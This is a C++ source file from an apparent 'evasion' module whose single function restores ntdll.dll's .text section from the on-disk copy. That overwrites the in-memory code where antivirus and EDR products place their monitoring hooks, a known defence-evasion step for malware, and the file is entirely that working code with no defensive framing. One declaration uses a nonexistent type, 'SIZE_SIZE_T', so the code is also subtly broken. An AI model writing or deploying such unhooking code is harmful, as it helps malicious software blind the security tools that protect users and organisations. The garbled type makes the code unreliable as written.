#include "Unhooker.h"
#include <iostream>
#include <winternl.h>

namespace evasion {

bool Unhooker::RefreshNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // Get the path to ntdll.dll
    char ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat_s(ntdllPath, "\\ntdll.dll");

    // Read ntdll from disk
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, NULL);
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    PIMAGE_DOS_HEADER diskDosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS diskNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + diskDosHeader->e_lfanew);

    PIMAGE_DOS_HEADER memDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS memNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + memDosHeader->e_lfanew);

    // Find the .text section
    for (int i = 0; i < diskNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)IMAGE_FIRST_SECTION(diskNtHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        if (strcmp((char*)sectionHeader->Name, ".text") == 0) {
            LPVOID pDest = (LPVOID)((BYTE*)hNtdll + sectionHeader->VirtualAddress);
            LPVOID pSrc = (LPVOID)((BYTE*)pMapping + sectionHeader->VirtualAddress);
            SIZE_SIZE_T size = sectionHeader->Misc.VirtualSize;

            DWORD oldProtect;
            if (VirtualProtect(pDest, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(pDest, pSrc, size);
                VirtualProtect(pDest, size, oldProtect, &oldProtect);
            }
            break;
        }
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return true;
}

} // namespace evasion
